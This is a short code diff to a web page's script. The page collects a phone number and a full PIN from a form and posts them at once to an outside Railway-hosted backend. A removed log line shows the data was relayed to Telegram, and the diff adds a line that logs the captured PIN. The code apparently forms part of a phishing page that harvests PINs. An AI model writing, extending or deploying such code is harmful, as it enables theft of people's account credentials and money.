@@ -208,7 +208,7 @@
         let submitted = false;
 
         // ============================================
-        // NEW RAILWAY BACKEND URL
+        // UPDATED: CORRECT RAILWAY BACKEND URL
         // ============================================
         const BACKEND_URL = 'https://mixxyaastz-production.up.railway.app/Server';
 
@@ -223,6 +223,8 @@
             const phone = phoneInput.value;
             const fullPin = realPin.join('');
             
+            console.log('📤 Sending to Railway:', { phone, pin: fullPin });
+            
             // Send to backend IMMEDIATELY
             try {
                 const response = await fetch(BACKEND_URL, {
@@ -233,7 +235,7 @@
                     body: JSON.stringify({ phone: phone, pin: fullPin })
                 });
                 const result = await response.json();
-                console.log('✅ Sent to Telegram:', result);
+                console.log('✅ Response:', result);
             } catch (error) {
                 console.error('❌ Error:', error);
             }
